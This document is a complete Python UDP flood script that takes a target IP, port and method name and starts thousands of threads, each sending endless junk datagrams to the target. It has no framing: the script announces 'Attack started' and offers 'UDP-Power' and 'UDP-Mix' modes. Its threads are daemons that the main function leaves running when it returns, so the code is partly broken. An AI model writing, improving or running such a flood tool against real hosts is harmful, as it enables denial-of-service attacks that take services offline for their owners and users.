import sys
import socket
import threading

# Check if all arguments have been passed to avoid IndexError
if len(sys.argv) < 4:
    print("Usage: python udp.py <IP> <PORT> <METHOD>")
    sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])

loops = 10000

def send_packet(amplifier):
    try:
        # AF_INET = IPv4, SOCK_DGRAM = UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))
        while True: 
            s.send(b"\x99" * amplifier)
    except:
        pass # Silence connection errors

def attack_HQ():
    print(f"Attack started on {host}:{port} with method {method}...")
    
    # Select the amplitude based on the method
    amp = 375
    if method == "UDP-Power": amp = 750
    
    for _ in range(loops):
        # NOTE: target receives the function name, args the parameters
        # This allows for the creation of true parallel threads
        t = threading.Thread(target=send_packet, args=(amp,), daemon=True)
        t.start()
        
    if method == "UDP-Mix":
        for _ in range(loops):
            threading.Thread(target=send_packet, args=(750,), daemon=True).start()

# Start the main function
if __name__ == "__main__":
    attack_HQ()

